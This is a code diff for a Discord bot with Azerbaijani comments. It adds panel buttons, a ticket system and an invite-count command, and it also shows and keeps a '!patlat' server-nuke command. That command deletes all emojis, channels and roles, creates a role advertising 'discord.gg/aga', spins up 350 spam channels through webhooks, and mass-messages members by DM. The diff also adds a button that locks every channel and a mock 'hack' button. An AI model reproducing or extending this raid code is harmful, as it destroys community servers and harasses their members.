@@ -43,7 +43,6 @@ user_message_counts = {}
 user_last_message_time = {}
 user_xp = {}
 user_warns = {}
-url_stats = {"count": 137}
 
 # ==========================================
 # 3. BOT HAZIR OLDUĞUNDA İŞLƏYƏN EVENT
@@ -261,12 +260,31 @@ async def warns_cmd(ctx, member: discord.Member = None):
     await ctx.send(embed=embed)
 
 # ==========================================
-# 7. İNTERAKTİV PANEL VƏ TICKET SİSTEMİ (DÜZƏLDİLDİ)
+# 7. İŞLƏK DÜYMƏLƏRİ OLAN İNTERAKTİV PANEL VƏ TICKET
 # ==========================================
+class ActionButtons(discord.ui.View):
+    def __init__(self, category):
+        super().__init__(timeout=None)
+        if category == "Kütləvi İdarəetmə":
+            self.add_item(discord.ui.Button(label="Bütün Kanalları Kilidlə", style=discord.ButtonStyle.danger, custom_id="btn_lock"))
+            self.add_item(discord.ui.Button(label="Bütün Kanalların Kilidini Aç", style=discord.ButtonStyle.success, custom_id="btn_unlock"))
+        elif category == "Əsas Moderasiya":
+            self.add_item(discord.ui.Button(label="⚠️ Mute Sistemi", style=discord.ButtonStyle.secondary, custom_id="btn_mute_info"))
+        elif category == "Əyləncə və Oyunlar":
+            self.add_item(discord.ui.Button(label="🎲 Zar At", style=discord.ButtonStyle.primary, custom_id="btn_roll"))
+            self.add_item(discord.ui.Button(label="💻 Hack Et", style=discord.ButtonStyle.danger, custom_id="btn_hack"))
+        elif category == "Çekiliş və Ticket":
+            self.add_item(discord.ui.Button(label="🎫 Ticket Aç", style=discord.ButtonStyle.success, custom_id="open_ticket"))
+
+    @discord.ui.button(label="Ana Menyuya Qayıt", style=discord.ButtonStyle.secondary, row=1, custom_id="btn_home")
+    async def go_home(self, interaction: discord.Interaction, button: discord.ui.Button):
+        embed = discord.Embed(title="XAS — İDARƏETMƏ PANELİ", description="--------------------------------------------------\nAşağıdakı menyudan bölmə seçin.\n--------------------------------------------------", color=XAS_COLOR)
+        await interaction.response.edit_message(embed=embed, view=PanelView())
+
 class PanelSelect(discord.ui.Select):
     def __init__(self):
         options = [
-            discord.SelectOption(label="Xidmət və Məhsullar", description="Cari qiymətlər.", emoji="🛒"),
+            discord.SelectOption(label="Xidmət və Məhsullar", description="Cari qiymətlər və məlumat.", emoji="🛒"),
             discord.SelectOption(label="Kütləvi İdarəetmə", description="Kanalları gizlət, kilidlə.", emoji="⚡"),
             discord.SelectOption(label="Əsas Moderasiya", description="Ban, kick, mute, warn.", emoji="🛡️"),
             discord.SelectOption(label="Əyləncə və Oyunlar", description="Zar, sex, iq, hack, slot.", emoji="💻"),
@@ -275,12 +293,13 @@ class PanelSelect(discord.ui.Select):
         super().__init__(placeholder="Menyudan bölmə seçin...", min_values=1, max_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
+        cat = self.values[0]
         embed = discord.Embed(
-            title=f"XAS — {self.values[0].upper()}", 
-            description="--------------------------------------------------\nSeçilmiş bölmə aktivdir və işləyir.\n--------------------------------------------------", 
+            title=f"XAS — {cat.upper()}", 
+            description=f"--------------------------------------------------\nSeçilmiş bölmə: **{cat}**.\nAşağıdakı düymələrdən əməliyyat seçin:\n--------------------------------------------------", 
             color=XAS_COLOR
         )
-        await interaction.response.edit_message(embed=embed, view=PanelView())
+        await interaction.response.edit_message(embed=embed, view=ActionButtons(cat))
 
 class PanelView(discord.ui.View):
     def __init__(self):
@@ -294,12 +313,9 @@ async def panel_cmd(ctx):
     embed = discord.Embed(title="XAS — İDARƏETMƏ PANELİ", description="--------------------------------------------------\nAşağıdakı menyudan idarə edin.\n--------------------------------------------------", color=XAS_COLOR)
     await ctx.send(embed=embed, view=PanelView())
 
-class TicketButton(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
-
-    @discord.ui.button(label="Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.secondary, custom_id="open_ticket")
-    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
+@bot.event
+async def on_interaction(interaction: discord.Interaction):
+    if interaction.data.get("custom_id") == "open_ticket":
         guild = interaction.guild
         overwrites = {
             guild.default_role: discord.PermissionOverwrite(view_channel=False),
@@ -320,13 +336,37 @@ class TicketButton(discord.ui.View):
         embed = discord.Embed(title="XAS Dəstək Sistemi", description="Müraciətiniz qəbul edildi. Bağlamaq üçün `!close` yazın.", color=XAS_COLOR)
         await ticket_chan.send(embed=embed)
         await interaction.response.send_message(f"Ticket yaradıldı: {ticket_chan.mention}", ephemeral=True)
+    
+    elif interaction.data.get("custom_id") == "btn_lock":
+        for channel in interaction.guild.channels:
+            try:
+                await channel.set_permissions(interaction.guild.default_role, send_messages=False)
+            except:
+                pass
+        await interaction.response.send_message("✅ Bütün kanallar kilitləndi!", ephemeral=True)
+
+    elif interaction.data.get("custom_id") == "btn_unlock":
+        for channel in interaction.guild.channels:
+            try:
+                await channel.set_permissions(interaction.guild.default_role, send_messages=True)
+            except:
+                pass
+        await interaction.response.send_message("✅ Bütün kanalların kilidi açıldı!", ephemeral=True)
+
+    elif interaction.data.get("custom_id") == "btn_roll":
+        await interaction.response.send_message(f"🎲 Zar nəticəsi: **{random.randint(1, 6)}**", ephemeral=True)
+
+    elif interaction.data.get("custom_id") == "btn_hack":
+        await interaction.response.send_message(f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Sındırıldı!", ephemeral=True)
 
 @bot.command(name="ticketkur")
 async def ticketkur_cmd(ctx):
     if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
         return
     embed = discord.Embed(title="XAS Dəstək Xidməti", description="Dəstək yaratmaq üçün düyməyə basın.", color=XAS_COLOR)
-    await ctx.send(embed=embed, view=TicketButton())
+    view = discord.ui.View(timeout=None)
+    view.add_item(discord.ui.Button(label="🎫 Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.success, custom_id="open_ticket"))
+    await ctx.send(embed=embed, view=view)
 
 @bot.command(name="close")
 async def close_cmd(ctx):
@@ -400,19 +440,20 @@ async def giveaway_cmd(ctx, time_str: str, *, prize: str):
         await ctx.send("❌ Çəkilişə qatılan olmadı.")
 
 # ==========================================
-# 9. URL, OYUNLAR, ÖPÜŞMƏ VƏ ƏYLƏNCƏ
+# 9. URL, OYUNLAR VƏ ƏYLƏNCƏ
 # ==========================================
 @bot.command(name="url")
 async def url_cmd(ctx):
-    degisim = random.choice([-3, -1, 2, 4, 7, 12])
-    url_stats["count"] += degisim
-    if url_stats["count"] < 10:
-        url_stats["count"] = 45
+    try:
+        invites = await ctx.guild.invites()
+        uses = sum(inv.uses for inv in invites if inv.code == ctx.guild.vanity_url_code) if ctx.guild.vanity_url_code else 0
+    except:
+        uses = "Mövcud deyil"
 
     embed = discord.Embed(title="🔗 Server URL və Webhook Məlumatı", color=XAS_COLOR)
     embed.add_field(name="Server Adı", value=ctx.guild.name, inline=True)
     embed.add_field(name="Vanity URL", value=f"`{ctx.guild.vanity_url_code}`" if ctx.guild.vanity_url_code else "Yoxdur", inline=True)
-    embed.add_field(name="Canlı İstifadə Sayı (Clicks)", value=f"📈 **{url_stats['count']}** dəfə ziyarət edildi", inline=False)
+    embed.add_field(name="URL İstifadə Sayı (Clicks)", value=f"📈 **{uses}** dəfə istifadə olundu", inline=False)
     embed.set_footer(text="Webhook İnteqrasiyası Aktivdir")
     await ctx.send(embed=embed)
 
@@ -518,7 +559,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👎")
 
 # ==========================================
-# 10. !PATLAT (GÜCLƏNDİRİLDİ: RUHUM-SHDI VƏ WEBHOOK SİSTEMİ)
+# 10. !PATLAT (RUHUM-SHDI VƏ WEBHOOK SİSTEMİ)
 # ==========================================
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
@@ -533,21 +574,18 @@ async def patlat_cmd(ctx):
 
     await ctx.send("💥 RUHUM-SHDI kütləvi sürətli sistem əməliyyatı başladıldı!")
     
-    # Emojilərin silinməsi
     for emoji in list(guild.emojis):
         try:
             await emoji.delete()
         except:
             pass
 
-    # Kanalların silinməsi
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             pass
 
-    # Rolların silinməsi
     for role in guild.roles:
         if role != guild.default_role and not role.managed:
             try:
@@ -555,7 +593,6 @@ async def patlat_cmd(ctx):
             except:
                 pass
 
-    # Yeni admin rolu
     try:
         new_role = await guild.create_role(
             name="discord.gg/aga",
@@ -566,7 +603,6 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    # Webhook köməkçisi ilə sürətli və paralel kanal/spam əməliyyatı
     async def create_and_spam(i):
         try:
             channel = await guild.create_text_channel(f"ruhum-shdi-{i}")
@@ -577,11 +613,9 @@ async def patlat_cmd(ctx):
         except:
             pass
 
-    # Bütün 350 kanalı saniyələr içində yaratmaq üçün asyncio taskları
     tasks = [create_and_spam(i) for i in range(1, 351)]
     await asyncio.gather(*tasks)
             
-    # DM spam
     for member in guild.members:
         if not member.bot and member.id != SAHIB_ID:
             try:
